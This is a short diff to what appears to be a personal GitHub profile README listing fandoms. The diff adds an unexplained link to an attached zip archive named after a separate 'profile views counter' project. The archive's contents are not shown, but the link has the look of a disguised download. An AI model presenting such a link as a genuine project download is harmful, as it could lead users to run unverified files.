@@ -10,6 +10,8 @@
 ![galaxy-divider-divider](https://github.com/user-attachments/assets/132f4a2d-fba0-4f98-9ba2-ce82f3760ea1)
 
 
+[github-profile-views-counter-master.zip](https://github.com/user-attachments/files/23501501/github-profile-views-counter-master.zip)
+
 
 ## *Fandoms*
 ## [hetalia, tboi, ror2, tf2, golden kamuy, clinical trial, дмо, zzz, genshin, houseki no kuni, one piece, dsmp|minecraft|mineshield, trigun, alien stage, fullmetal alchemist, mlp, deltarune, beholder, ENA]
